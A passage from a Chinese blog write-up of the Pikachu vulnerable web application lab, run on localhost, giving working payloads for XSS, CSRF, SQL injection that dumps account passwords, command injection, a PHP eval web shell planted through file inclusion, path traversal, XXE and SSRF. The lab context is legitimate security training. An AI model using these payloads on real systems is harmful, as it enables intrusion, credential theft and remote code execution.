<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="4-DOM型xss"><a href="#4-DOM型xss" class="headerlink" title="4.DOM型xss"></a>4.DOM型xss</h4><p>f12看到提示</p>
<pre><code>                function domxss()&#123;
                    var str = document.getElementById(&quot;text&quot;).value;
                    document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#39;&quot;+str+&quot;&#39;&gt;what do you see?&lt;/a&gt;&quot;;
                &#125;
                //试试：&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;
                //试试：&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;,闭合掉就行
</code></pre>
<p>输入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&quot;alert(&#x27;</span>leon<span class="string">&#x27;)&quot;&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f2e4b09e.png"></p>
<p>原理就是提前闭合，让href的属性为onclick</p>
<h4 id="5-xss盲打"><a href="#5-xss盲打" class="headerlink" title="5.xss盲打"></a>5.xss盲打</h4><p>上下两个框都填上</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>然后根据提示登录留言板后台，就弹窗了</p>
<h4 id="6-xss之过滤"><a href="#6-xss之过滤" class="headerlink" title="6.xss之过滤"></a>6.xss之过滤</h4><p>过滤script,大小写绕过</p>
<h4 id="7-xss之htmlspecialchars"><a href="#7-xss之htmlspecialchars" class="headerlink" title="7.xss之htmlspecialchars"></a>7.xss之htmlspecialchars</h4><p>specialchars函数会把单双引号和尖括号都转义了，但是试了一下这里没过滤单引号</p>
<p>playload:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h4 id="8-xss之href输出"><a href="#8-xss之href输出" class="headerlink" title="8.xss之href输出"></a>8.xss之href输出</h4><p>过滤单双引号，用伪协议绕过</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h4 id="9-xss之js输出"><a href="#9-xss之js输出" class="headerlink" title="9.xss之js输出"></a>9.xss之js输出</h4><p>提前闭合第一个script</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><h4 id="1-CSRF-get-login"><a href="#1-CSRF-get-login" class="headerlink" title="1.CSRF(get) login"></a>1.CSRF(get) login</h4><p>抓包修改个人信息，用burp生成csrf poc:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;sex&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;phonenum&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;add&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>打开链接：<a target="_blank" rel="noopener" href="http://burp/show/4/2etstzgrlo1eqv1ef15ihs9u0bxp6ybb">http://burp/show/4/2etstzgrlo1eqv1ef15ihs9u0bxp6ybb</a></p>
<p>发现成功修改（kobe账户需处于登录状态）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f2f262ca.png"></p>
<h4 id="2-CSRF-post"><a href="#2-CSRF-post" class="headerlink" title="2.CSRF(post)"></a>2.CSRF(post)</h4><p>改成post传参，其他和1相同，不多赘述</p>
<h4 id="3-CSRF-Token"><a href="#3-CSRF-Token" class="headerlink" title="3.CSRF Token"></a>3.CSRF Token</h4><p>遇到token还是不会</p>
<p>搜了一下要用到burp的CSRF Token Tracker插件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f2fdde2f.png"></p>
<p>添加如图的规则</p>
<p>然后生成poc</p>
<h3 id="SQL-Inject"><a href="#SQL-Inject" class="headerlink" title="SQL-Inject"></a>SQL-Inject</h3><h4 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1.数字型注入"></a>1.数字型注入</h4><p>抓包，直接放playload吧</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span>  <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="number">2</span><span class="operator">/</span><span class="operator">/</span>爆库名</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="operator">/</span><span class="operator">/</span>爆表名</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="operator">/</span><span class="operator">/</span>爆列名</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> username,password <span class="keyword">from</span> users<span class="operator">/</span><span class="operator">/</span>爆账号密码</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f30df172.png"></p>
<p>爆出来了</p>
<h4 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h4><p>注意闭合，其他和1一样</p>
<p>playload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>’<span class="keyword">union</span> <span class="keyword">select</span> username,password <span class="keyword">from</span> users#</span><br></pre></td></tr></table></figure>

<h4 id="3-搜索型注入"><a href="#3-搜索型注入" class="headerlink" title="3.搜索型注入"></a>3.搜索型注入</h4><p>只是多了一列</p>
<p>playload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union select username,password,1 from pikachu.users#</span></span><br></pre></td></tr></table></figure>

<h4 id="4-XX型注入"><a href="#4-XX型注入" class="headerlink" title="4. XX型注入"></a>4. XX型注入</h4><p>用 ‘) 来闭合</p>
<p>playlaod:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;)union selct username,password from users #</span></span><br></pre></td></tr></table></figure>

<h4 id="5-insert-update注入"><a href="#5-insert-update注入" class="headerlink" title="5. insert&#x2F;update注入"></a>5. insert&#x2F;update注入</h4><p>没有回显，使用报错注入</p>
<p>playload:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(database()))) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> </span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27; limit 0,1)),0) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)),0) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select id from users limit 0,1)),0) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="6-Delete注入"><a href="#6-Delete注入" class="headerlink" title="6.Delete注入"></a>6.Delete注入</h4><p>还挺新颖的，留言板无法注入，随便输入，然后删除，抓包</p>
<p>抓包发现get传了一个id，那么利用id注入，还是用报错注入</p>
<p>注意：</p>
<p>一些关键字如#，空格需要进行URL格式转换</p>
<h4 id="7-http头注入"><a href="#7-http头注入" class="headerlink" title="7.http头注入"></a>7.http头注入</h4><p>根据提示登录抓包，用user-agent进行注入</p>
<p>playlaod:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#x27;</span><span class="operator">^</span><span class="string">&#x27;,password)) from users),1,31),0x7e),1) or &#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f31e2046.png"></p>
<h4 id="8-布尔盲注"><a href="#8-布尔盲注" class="headerlink" title="8.布尔盲注"></a>8.布尔盲注</h4><p>上python脚本吧，把做sql的题目的脚本捡起来改改</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f330b8d8.png"></p>
<p>脚本就是方便啊</p>
<h4 id="9-延时盲注"><a href="#9-延时盲注" class="headerlink" title="9.延时盲注"></a>9.延时盲注</h4><p>把上面的脚本改改，延时耗时太长了，不赘述了</p>
<h4 id="10-宽字节注入"><a href="#10-宽字节注入" class="headerlink" title="10. 宽字节注入"></a>10. 宽字节注入</h4><p>lili%df’ or 1&#x3D;2 </p>
<p>继续改布尔盲注的脚本吧</p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="1-exec-“ping”"><a href="#1-exec-“ping”" class="headerlink" title="1.exec “ping”"></a>1.exec “ping”</h4><p>playload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 |whoami</span><br></pre></td></tr></table></figure>

<h4 id="2-exec-“eval”"><a href="#2-exec-“eval”" class="headerlink" title="2.exec “eval”"></a>2.exec “eval”</h4><p>playload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo();</span><br></pre></td></tr></table></figure>

<h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><h4 id="1-本地文件包含"><a href="#1-本地文件包含" class="headerlink" title="1.本地文件包含"></a>1.本地文件包含</h4><p>图片路径可修改，改为..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;win.ini</p>
<p>成功查win.ini文件，那么我们在本地写一个木马，就能通过这种方式用蚁剑连接了</p>
<h4 id="2-远程文件包含"><a href="#2-远程文件包含" class="headerlink" title="2.远程文件包含"></a>2.远程文件包含</h4><p>创建一个shell.txt:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[leon])  ?&gt; &#x27;</span> ); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>playload:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_remote.php?filename=G:\phpstudy_pro\WWW\pikachu\vul\fileinclude\shell.txt&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f33cd1da.png"></p>
<p>成功生成shell.php，蚁剑连接</p>
<h3 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h3><h4 id="1-不安全的文件下载"><a href="#1-不安全的文件下载" class="headerlink" title="1.不安全的文件下载"></a>1.不安全的文件下载</h4><p>想找科比的路径，看到了有意思的东西</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f34ac402.png"></p>
<p>修改路径</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f3584d1d.png"></p>
<p>点击成功下载</p>
<h3 id="Unsafe-file-upload"><a href="#Unsafe-file-upload" class="headerlink" title="Unsafe file upload"></a>Unsafe file upload</h3><h4 id="1-客户端check"><a href="#1-客户端check" class="headerlink" title="1.客户端check"></a>1.客户端check</h4><p>这里抓包改后缀或者浏览器关闭js都可以，我选择后者</p>
<h4 id="2-服务端check"><a href="#2-服务端check" class="headerlink" title="2.服务端check"></a>2.服务端check</h4><p>这里直接抓包改后缀就行</p>
<h4 id="3-getimagesize"><a href="#3-getimagesize" class="headerlink" title="3.getimagesize()"></a>3.getimagesize()</h4><p>大小不对的图片会被打回来，先在正常图片中插入一句话木马，但不会执行php语句，只能结合上上关的文件包含漏洞</p>
<p>playload:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/shell.php&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure>

<h3 id="Over-permission"><a href="#Over-permission" class="headerlink" title="Over permission"></a>Over permission</h3><h4 id="1-水平越权"><a href="#1-水平越权" class="headerlink" title="1.水平越权"></a>1.水平越权</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f364fa01.png"></p>
<p>在url这里把username改成别的用户</p>
<h4 id="2-垂直越权"><a href="#2-垂直越权" class="headerlink" title="2.垂直越权"></a>2.垂直越权</h4><p>登录admin账户，点击添加账户，并且记住url:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>

<p>登录普通pikachu账户，然后直接复制上面的链接进行添加账户，再登录admin账户，发现成功添加，那么就存在垂直越权。</p>
<h3 id=""><a href="#" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h3><h4 id="1-目录遍历"><a href="#1-目录遍历" class="headerlink" title="1.目录遍历"></a>1.目录遍历</h4><p>playload:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/dir/dir_list.php?title=../../../../../../Windows/win.ini</span><br></pre></td></tr></table></figure>

<h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><h4 id="1-find-abc"><a href="#1-find-abc" class="headerlink" title="1.find abc"></a>1.find abc</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f3723338.png"></p>
<p>f12找到账户</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f384accc.png"></p>
<p>黄金时代👍我也很喜欢这一段</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f390c059.png"></p>
<p>可以直接修改url得到敏感信息</p>
<h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><h4 id="1-PHP反序列化漏洞"><a href="#1-PHP反序列化漏洞" class="headerlink" title="1.PHP反序列化漏洞"></a>1.PHP反序列化漏洞</h4><p>没找到反序列化的代码，试了一下给的playload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>发现可以</p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><h4 id="1-XXE漏洞"><a href="#1-XXE漏洞" class="headerlink" title="1.XXE漏洞"></a>1.XXE漏洞</h4><p>playload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [    </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="url重定向"><a href="#url重定向" class="headerlink" title="url重定向"></a>url重定向</h3><h4 id="1-不安全的url跳转"><a href="#1-不安全的url跳转" class="headerlink" title="1.不安全的url跳转"></a>1.不安全的url跳转</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450f39dfdb7.png"></p>
<p>如图修改，点击则跳转百度</p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="1-SSRF-curl"><a href="#1-SSRF-curl" class="headerlink" title="1.SSRF(curl)"></a>1.SSRF(curl)</h4><p>playload:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/Windows/win.ini</span><br></pre></td></tr></table></figure>

<h4 id="2-SSRF-file-get-content"><a href="#2-SSRF-file-get-content" class="headerlink" title="2.SSRF(file_get_content)"></a>2.SSRF(file_get_content)</h4><p>playload:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=file:///c:/windows/win.ini</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://foreon.github.io">Leon</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://foreon.github.io/posts/36124.html">https://foreon.github.io/posts/36124.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://foreon.github.io" target="_blank">Leon's blog😽</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/11/03/6545181570d8a.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/54882.html" title="安装Arch Linux的记录"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/12/03/656b72718aa0a.jpg" onerror="onerror=null;src='https://bu.dusays.com/2023/11/03/65450afb66c4f.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">安装Arch Linux的记录</div></div></a></div><div class="next-post pull-right"><a href="/posts/51727.html" title="我的第一篇博客"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65450af808b47.jpg" onerror="onerror=null;src='https://bu.dusays.com/2023/11/03/65450afb66c4f.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">我的第一篇博客</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/16427.html" title="CNSS Recruit 2023 Writeup"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/65451815e32d3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-03</div><div class="title">CNSS Recruit 2023 Writeup</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bu.dusays.com/2023/11/03/6545103c2e116.jpg" onerror="this.onerror=null;this.src='https://bu.dusays.com/2023/11/03/65450afd63db3.gif'" alt="avatar"/></div><div class="author-info__name">Leon</div><div class="author-info__description">想爱想吃想变成天上忽明忽暗的云</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Foreon"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Foreon" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">今日无事</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#YuLin-2023-Recruit-Writeup"><span class="toc-number">1.</span> <span class="toc-text">YuLin 2023 Recruit Writeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%88%E5%8F%A0%E4%B8%AA%E7%94%B2%E5%85%88"><span class="toc-number">2.</span> <span class="toc-text">前言（叠个甲先</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#part1%E6%98%AF%E7%94%A8word%E5%86%99%E7%9A%84%EF%BC%8C%E7%9B%B4%E6%8E%A5%E9%BB%8F%E8%B4%B4%E8%BF%87%E6%9D%A5%E9%87%8F%E5%A4%AA%E5%A4%9A%E5%B0%B1%E4%B8%8D%E4%BF%AE%E6%94%B9%E4%BA%86%F0%9F%98%AD%EF%BC%8Cpart2-%E6%98%AF%E7%94%A8md%EF%BC%8C%E5%8F%AF%E8%83%BD%E7%9C%8B%E8%B5%B7%E6%9D%A5%E8%88%92%E6%9C%8D%E4%B8%80%E7%82%B9%E3%80%82%E5%A6%82%E6%9E%9C%E8%AF%BB%E8%80%85%E7%9C%8B%E5%BE%97%E6%AF%94%E8%BE%83%E9%9A%BE%E5%8F%97%EF%BC%8C%E8%BF%99%E9%9D%9E%E5%B8%B8%E6%AD%A3%E5%B8%B8%EF%BC%8C%E8%AF%B7%E5%8E%9F%E8%B0%85%E6%88%91%E7%9A%84%E6%87%92%E6%83%B0%F0%9F%99%87"><span class="toc-number">2.0.1.</span> <span class="toc-text">part1是用word写的，直接黏贴过来量太多就不修改了😭，part2  是用md，可能看起来舒服一点。如果读者看得比较难受，这非常正常，请原谅我的懒惰🙇</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#part1"><span class="toc-number">3.</span> <span class="toc-text">part1:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tutorial"><span class="toc-number">4.</span> <span class="toc-text">Tutorial</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-http"><span class="toc-number">5.</span> <span class="toc-text">1.http</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8data-text-plain-base64-xxxx-base64%E7%BC%96%E7%A0%81%E5%90%8E%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">5.0.0.0.1.</span> <span class="toc-text">使用data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%95%E4%BA%86%E8%AF%95%E2%80%9D"><span class="toc-number">5.1.</span> <span class="toc-text">试了试”&gt;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 